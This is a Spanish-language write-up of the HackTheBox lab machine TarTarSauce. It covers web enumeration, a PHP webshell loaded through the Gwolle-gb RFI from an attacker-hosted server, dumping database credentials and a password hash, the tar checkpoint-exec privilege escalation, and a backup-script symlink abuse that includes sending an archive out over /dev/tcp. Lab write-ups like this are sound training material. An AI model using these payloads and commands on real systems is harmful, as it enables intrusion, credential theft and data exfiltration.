# 10.10.10.88 - TarTarSauce
---------------------------

Puertos abiertos: 80(http) ```└─$ nmap -sCV -T5 -v -p- --open -Pn 10.10.10.88```

Puerto 80 -> Apache httpd 2.4.18. Un robots.txt con las entradas:
- /webservices/tar/tar/source/   
- /webservices/monstra-3.0.4/  
- /webservices/easy-file-uploader/  
- /webservices/developmental/  
- /webservices/phpmyadmin/  

Si buscamos la web por curl, vemos un dibujo ascii de un bote de salsa (tartara supongo) y nada más.

- Busqueda por subdirectorios ```└─$ wfuzz -c --hw=53 -w $(locate subdomains-top1million-5000.txt) -H "Host: FUZZ.10.10.10.88" -u http://10.10.10.88/ -t 100```


## Monstra

/webservices/monstra-3.0.4/
Tiene varios botones pero ninguno es funcional.

Lo que si funciona es el boton de admin: /webservices/monstra-3.0.4/admin/
Te sale un panel de autenticación. Puse admin:admin para ver como se tramitaba la petición pero entré por ser 
las credenciales correctas.

Indagando por la web, encontré una zona para subir archivos, por lo que pensé en subir una php webshell, pero
antes es ideal buscar en searchsploit **monstra 3.0.4**. Acabé dando con un exploit que me decía se subir la
webshell con la extensión php7

```console
└─$ cat cmd.php7
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
Se supone que se queda en /monstra/public/uploads/shell.php7?cmd=id. Pero me dice que el archivo no se subió
correctamente. Si pruebas a mandar un archivo txt normal "Hola Mundo" tampoco te deja, porlo que no parece muy
funcional.

```console
└─$ wfuzz --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.10.10.88/FUZZ/" -t 200
000001954:   403        11 L     32 W       298 Ch      "webservices"
000000070:   403        11 L     32 W       292 Ch      "icons"
└─$ wfuzz --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.10.10.88/webservices/FUZZ/" -t 200
000000780:   200        197 L    567 W      11237 Ch    "wp"
└─$ wfuzz --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.10.10.88/webservices/wp/FUZZ/" -t 200
000000773:   403        11 L     32 W       313 Ch      "wp-includes"
000000228:   200        0 L      0 W        0 Ch        "wp-content"
000007167:   302        0 L      0 W        0 Ch        "wp-admin"
```

Sin duda estamos ante un worpdress. 
Una de las cosas a tener en cuenta al explotar los wordpress son el tema de los "plugins" (wp-content/plugins)

Hay un diccionario específico para ello:

```console
└─$ wfuzz --hc=404 -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -u "http://10.10.10.88/webservices/wp/FUZZ/" -t 200

000000468:   200        0 L      0 W        0 Ch        "wp-content/plugins/akismet/"
000004504:   200        0 L      0 W        0 Ch        "wp-content/plugins/gwolle-gb/"
000004593:   500        0 L      0 W        0 Ch        "wp-content/plugins/hello.php/"
```

Antes de entrar a fondo con los plugins, si visitamos "http://10.10.10.88/webservices/wp/" nos encontramos con
una web mal formateada, eso suele pasar por un problema del dns. SI hacemos un **curl** para ver el código fuente
encontramos "src='http://tartarsauce.htb/"

Aun asi no hay nada interesante.

Si buscamos los dos plugins (akismet y gwolle) en searchsploit enctrontramos que askismet sufre de un xss (no
interesa por ahora) y que gwolle tiene un RFI (CVE-2015-8351)

Nos dice que pongamos un archivo llamado "wp-load.php" en esta ruta:

```/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]```

Podemos aprovehcar el php7 de antes simplemente renombrandolo: ```└─$ mv cmd.php7 wp-load.php```

```console
└─$ curl -s -X GET 'http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.16/wp-load.php'
└─$ sudo python3 -m http.server 80
10.10.10.88 - - [17/Dec/2022 11:11:57] "GET /wp-load.phpwp-load.php HTTP/1.0" 404 -
└─$ curl -s -X GET 'http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.16/
<pre></pre>
```


```console
www-data@TartarSauce:/var/www/html/webservices/wp$ cat wp-config.php
define('DB_USER', 'wpuser');

/** MySQL database password */
define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');

www-data@TartarSauce:/var/www/html/webservices/wp$ mysql -u wpuser -p
Enter password: w0rdpr3$$d@t@b@$3@cc3$$
mysql> show databases; # wp
mysql> select wp;
mysql> show tables;  # wp_users
mysql> select * from wp_users;
wpadmin    | $P$BBU0yjydBz9THONExe2kPEsvtjStGe1
```
Pero no podemos romperlo con el john.
Seguimos enumerando el sistema.

- Usuarios del Sistema ->  root onuma
- SUIDS -> /var/www/html/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ȜӎŗgͷͼȜ_5h377
- Nopasswd -> (onuma) NOPASSWD: /bin/tar

Si buscamos tar en [gtfobins](https://gtfobins.github.io/gtfobins/tar/) damos con este comando:
```console
www-data@TartarSauce:/home$ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
$ whoami
onuma
$ bash
onuma@TartarSauce:/home$
```

Si volvemos a enumerar el sistema: 
Encontramos que onuma es propietario de este archivo > /var/backups/onuma-www-dev.bak
Tambien corremos el procmon.sh encontrando:

```console
> /bin/bash /usr/sbin/backuperer
> /bin/bash /usr/sbin/backuperer
> /usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.61d9f97e18c700f859b86c10605381d9e3e2d087 /var/www/html
> /bin/sleep 30
> /bin/tar -zcvf /var/tmp/.61d9f97e18c700f859b86c10605381d9e3e2d087 /var/www/html
> gzip
> /bin/tar -zxvf /var/tmp/.61d9f97e18c700f859b86c10605381d9e3e2d087 -C /var/tmp/check
> gzip -d
> /bin/bash /usr/sbin/backuperer
> /usr/bin/diff -r /var/www/html /var/tmp/check/var/www/html
> /bin/rm -rf /var/tmp/check . ..
```

```bash
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

El script es muy lioso por la cantidad de variables que tiene, asi que es mejor sutituirlas con el **vim**
```console
basedir=/var/www/html  > :%s/$basedir/"\/var\/www\/html"/g
.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1) > esto siempre te da un valor aleatorio de 40 caracteres
onuma@TartarSauce:/tmp$ /usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1
f333f7347381363152504fa8986320a2bfc3c34f
```

```bash
#!/bin/bash

# Set Vars Here
comprimido=/var/tmp/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)

bdr="------------------------------------------------------"

# Borra todos los archivos ocultos de /var/tmp y todo lo que haya en /var/tmp/check
/bin/rm -rf /var/tmp/.* /var/tmp/check

# Comprime en "$comprimido" todo lo de /var/www/html (la web) y espera 30 segundos
/usr/bin/sudo -u onuma /bin/tar -zcvf $comprimido /var/www/html &
/bin/sleep 30

# Crea "/var/tmp/check" y descomprime ahí el comprimido (valga la redundancia)
/bin/mkdir /var/tmp/check
/bin/tar -zxvf $comprimido -C /var/tmp/check

# Compara el backup con el original
if [[ $( /usr/bin/diff -r /var/www/html /var/tmp/check/var/www/html ) ]]
then
    # La diferencia la mete en "/var/backups/onuma_backup_error.txt"
    /usr/bin/printf $"$bdr\n $(/bin/date)\n$bdr\n$comprimido\n" >> /var/backups/onuma_backup_error.txt
    integrity_chk >> /var/backups/onuma_backup_error.txt
    exit 2
else
    # Mueve el comprimido (si no se altera) a /var/backups/onuma-www-dev.bak y borra el backup
    /bin/mv $comprimido /var/backups/onuma-www-dev.bak
    /bin/rm -rf /var/tmp/check .*
    exit 0
fi
```

Es decir que si cogieramos el "/var/www/html" lo modificaramos y lo cambiaramos por el archivo que crea podríamos
leer la diferencia.

```console
onuma@TartarSauce:/dev/shm$ /bin/tar -zcvf ./comp /var/www/html
└─$ sudo nc -nlvp 6666 > comp
onuma@TartarSauce:/dev/shm$ cat < ./comp > /dev/tcp/10.10.14.16/6666
└─$ tar -zxvf comp.tar
└─$ cd var/www/html
└─$ sudo ln -s -f /root/root.txt ./index.html
└─$ sudo tar -zcvf comp.tar ./var/www/html
onuma@TartarSauce:/dev/shm$ wget http://10.10.14.16/comp.tar
onuma@TartarSauce:/dev/shm$ mv comp.tar .211c85239d70a4f6b968ee6ac90f321cb381dc0b
```



